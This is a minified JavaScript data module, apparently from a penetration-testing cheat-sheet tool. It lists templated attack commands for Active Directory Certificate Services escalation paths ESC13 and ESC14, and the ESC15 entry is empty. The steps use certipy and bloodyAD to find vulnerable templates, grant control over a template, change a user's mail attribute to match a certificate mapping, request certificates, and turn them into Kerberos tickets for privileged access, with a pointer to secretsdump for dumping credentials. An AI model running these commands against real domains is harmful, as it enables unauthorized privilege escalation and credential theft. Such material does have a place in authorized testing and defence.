const e=[{title:"ESC13",description:"ESC13: Issuance Policy with Privileged Group Linked",template:`1) Enumerate AD CS for templates, OIDs and ESC13 indicators

certipy find -vulnerable -u {user} -hashes :{user_hash} -dc-ip {dc_ip} -stdout

2) Request a certificate from the vulnerable template (standard request)

certipy req -u {user} -hashes :{user_hash} -ca {ca_name} -template {template_name} -dc-ip {dc_ip} -dns {dns_ip}

3) (Optional) Request a certificate specifying a key size if needed

certipy req -u {user} -hashes :{user_hash} -ca {ca_name} -template {template_name} -dc-ip {dc_ip} -dns {dns_ip} -key-size {key_size}

4) Authenticate using the obtained PFX to get a Kerberos TGT / ccache (kirbi output)

certipy auth -pfx ./{pfx_file} -kirbi -dc-ip {dc_ip}

5) Use the resulting Kerberos TGT/ccache for actions with the elevated group membership (example: set KRB5CCNAME and run tooling that uses Kerberos tickets)

export KRB5CCNAME={pfx_owner}.ccache
# then use tools that accept Kerberos tickets, e.g., secretsdump.py -k -no-pass ... (tool-specific usage not duplicated here)`},{title:"ESC14",description:"ESC14: Weak Explicit Certificate Mapping",template:`1) Find the target user object and inspect altSecurityIdentities

netexec ldap {dc_host} -u {enumerator_user} -H {enumerator_hash} --query "(sAMAccountName={target_user})" ""

2) Confirm altSecurityIdentities value (or fetch explicitly)

bloodyAD --host {dc_host} -d {domain} -u {reader_user} -p {reader_pass} get object {target_user} --attr altSecurityIdentities

3) Give yourself (or operator) enrollment/control on the relevant certificate/template if required (make sure you have authorization)

bloodyAD --host {dc_host} -d {domain} -u {admin_user} -p {admin_pass} add genericAll "{cert_template_dn}" {admin_user}

4) Modify an enrollable account's email (or other certificate-supplied attribute) to match the altSecurityIdentities string

bloodyAD --host {dc_host} -d {domain} -u {modifier_user} -p {modifier_pass} set object {enrollee_user} mail -v {mapped_email}

5) Request a certificate as the enrollee account that will include the mapped value (normal and optional custom key-size request)

certipy req -username {enrollee_user_with_domain} -hashes :{enrollee_hash} -target {dc_host} -ca {ca_name} -template {template_name} -dc-ip {dc_ip}

certipy req -username {enrollee_user_with_domain} -hashes :{enrollee_hash} -target {dc_host} -ca {ca_name} -template {template_name} -dc-ip {dc_ip} -key-size {key_size}

6) Authenticate using the obtained PFX as the mapped account to obtain a TGT (and optionally the NT hash)

certipy auth -pfx ./{pfx_file} -dc-ip {dc_ip} -domain {domain} -username {mapped_username}`},{title:"ESC15",description:"ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019)",template:""}],t={commands:e};export{e as commands,t as default};
